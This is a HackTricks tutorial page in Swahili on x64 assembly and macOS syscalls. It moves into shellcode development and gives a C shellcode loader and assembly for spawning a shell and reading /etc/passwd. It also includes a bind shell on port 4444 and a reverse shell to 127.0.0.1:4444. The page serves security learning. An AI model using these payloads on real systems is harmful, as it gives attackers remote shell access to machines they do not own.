# Utangulizi wa x64

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Utangulizi wa x64**

x64, inayojulikana pia kama x86-64, ni usanifu wa processor wa biti 64 unaotumiwa sana katika kompyuta za mezani na seva. Ikitokana na usanifu wa x86 uliotengenezwa na Intel na baadaye kuchukuliwa na AMD kwa jina AMD64, ni usanifu unaotawala katika kompyuta za kibinafsi na seva leo.

### **Vidhivyo**

x64 inapanua usanifu wa x86, ikiwa na **registri 16 za matumizi ya jumla** zilizopewa majina `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, na `r8` hadi `r15`. Kila moja inaweza kuhifadhi thamani ya **biti 64** (baiti 8). Registri hizi pia zina sub-registri za biti 32, 16, na 8 kwa utangamano na kazi maalum.

1. **`rax`** - Mara nyingi hutumiwa kwa **thamani za kurudi** kutoka kwa kazi.
2. **`rbx`** - Mara nyingi hutumiwa kama **registri ya msingi** kwa operesheni za kumbukumbu.
3. **`rcx`** - Mara nyingi hutumiwa kama **kikokotozi cha mzunguko**.
4. **`rdx`** - Hutumiwa katika majukumu mbalimbali ikiwa ni pamoja na operesheni za hesabu za muda mrefu.
5. **`rbp`** - **Mnogeshaji wa msingi** kwa fremu ya steki.
6. **`rsp`** - **Mnogeshaji wa steki**, ukiweka rekodi ya juu ya steki.
7. **`rsi`** na **`rdi`** - Hutumiwa kama **vyanzo** na **marudio** ya viashiria katika operesheni za herufi/kumbukumbu.
8. **`r8`** hadi **`r15`** - Registri za matumizi ya jumla zilizoongezwa katika x64.

### **Mfumo wa Kuita**

Mfumo wa kuita wa x64 hutofautiana kati ya mifumo ya uendeshaji. Kwa mfano:

* **Windows**: **Parameta nne za kwanza** zinapitishwa katika registri **`rcx`**, **`rdx`**, **`r8`**, na **`r9`**. Parameta zaidi hupigwa kwenye steki. Thamani ya kurudi iko katika **`rax`**.
* **System V (inayotumiwa kawaida katika mifumo inayofanana na UNIX)**: **Parameta sita za nambari au viashiria** zinapitishwa katika registri **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, na **`r9`**. Thamani ya kurudi pia iko katika **`rax`**.

Ikiwa kazi ina zaidi ya viingizo sita, **vengine vitapitishwa kwenye steki**. **RSP**, mnogeshaji wa steki, lazima uwe **umepangishwa kwa baiti 16**, maana anwani inayolenga lazima igawanywe na 16 kabla ya wito wowote kufanyika. Hii inamaanisha kwamba kawaida tunahitaji kuhakikisha kwamba RSP imepangishwa vizuri katika shellcode yetu kabla ya kufanya wito wa kazi. Hata hivyo, kwa vitendo, wito wa mfumo hufanya kazi mara nyingi hata kama mahitaji haya hayakidhi.

### Mfumo wa Kuita katika Swift

Swift ina **mfumo wake wa kuita** ambao unaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Maagizo ya Kawaida**

Maagizo ya x64 yana seti tajiri, yakihifadhi utangamano na maagizo ya awali ya x86 na kuingiza mapya.

* **`mov`**: **Hamisha** thamani kutoka kwa **registri** au **eneo la kumbukumbu** kwenda lingine.
* Mfano: `mov rax, rbx` — Inahamisha thamani kutoka `rbx` kwenda `rax`.
* **`push`** na **`pop`**: Piga au toa thamani kwa/ kutoka kwa **steki**.
* Mfano: `push rax` — Inapiga thamani katika `rax` kwenye steki.
* Mfano: `pop rax` — Inatoa thamani ya juu kutoka kwenye steki kwenda `rax`.
* **`add`** na **`sub`**: Operesheni za **kuongeza** na **kupunguza**.
* Mfano: `add rax, rcx` — Inaongeza thamani katika `rax` na `rcx` ikihifadhi matokeo katika `rax`.
* **`mul`** na **`div`**: Operesheni za **kuzidisha** na **kugawanya**. Kumbuka: hizi zina tabia maalum kuhusu matumizi ya mizani.
* **`call`** na **`ret`**: Hutumiwa kwa **kuita** na **kurudi kutoka kwa kazi**.
* **`int`**: Hutumiwa kuanzisha **kizuizi cha programu**. K.m., `int 0x80` ilikuwa ikitumika kwa wito wa mfumo katika x86 Linux ya biti 32.
* **`cmp`**: **Linganisha** thamani mbili na weka bendera za CPU kulingana na matokeo.
* Mfano: `cmp rax, rdx` — Inalinganisha `rax` na `rdx`.
* **`je`, `jne`, `jl`, `jge`, ...**: Maagizo ya **kuruka kwa sharti** ambayo hubadilisha mtiririko wa udhibiti kulingana na matokeo ya `cmp` au jaribio la awali.
* Mfano: Baada ya maagizo ya `cmp rax, rdx`, `je label` — Inaruka kwenye `label` ikiwa `rax` ni sawa na `rdx`.
* **`syscall`**: Hutumiwa kwa **wito wa mfumo** katika baadhi ya mifumo ya x64 (kama vile Unix ya kisasa).
* **`sysenter`**: Maagizo ya **wito wa mfumo** ulioimarishwa kwenye majukwaa fulani.

### **Prologi ya Kazi**

1. **Piga mnogeshaji wa msingi wa zamani**: `push rbp` (huhifadhi mnogeshaji wa msingi wa mpigaji)
2. **Hamisha mnogeshaji wa steki ya sasa kwenda kwa mnogeshaji wa msingi**: `mov rbp, rsp` (inaweka mnogeshaji wa msingi mpya kwa kazi ya sasa)
3. **Tenga nafasi kwenye steki kwa mchanganyiko wa ndani**: `sub rsp, <ukubwa>` (ambapo `<ukubwa>` ni idadi ya baiti inayohitajika)

### **Epilogi ya Kazi**

1. **Hamisha mnogeshaji wa sasa wa msingi kwenda kwa mnogeshaji wa steki**: `mov rsp, rbp` (hufuta mchanganyiko wa ndani)
2. **Toa mnogeshaji wa zamani wa msingi kutoka kwenye steki**: `pop rbp` (inarejesha mnogeshaji wa msingi wa mpigaji)
3. **Rudi**: `ret` (inarudisha udhibiti kwa mpigaji)
## macOS

### syscalls

Kuna madarasa tofauti ya syscalls, unaweza [**kuzipata hapa**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Kisha, unaweza kupata nambari ya syscall kila [**katika url hii**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Kwa hivyo ili kuita `open` syscall (**5**) kutoka darasa la **Unix/BSD** unahitaji kuongeza: `0x2000000`

Kwa hivyo, nambari ya syscall ya kuita open itakuwa `0x2000005`

### Shellcodes

Kukusanya:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Kuondoa baits:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>Msimbo wa C kufanya majaribio ya shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Imechukuliwa kutoka [**hapa**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) na kufafanuliwa.

{% tabs %}
{% tab title="na adr" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}

{% tab title="na stack" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### Soma na cat

Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, hivyo hoja ya pili (x1) ni mfululizo wa vigezo (ambavyo kumbukumbu zake ni rundo la anwani).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Kuita amri na sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Kifungu cha Bind

Kifungu cha Bind kutoka [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) kwenye **bandari 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Kifaa cha Kugeuza Shell

Kifaa cha kugeuza shell kutoka [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Kifaa cha kugeuza shell kwenda **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
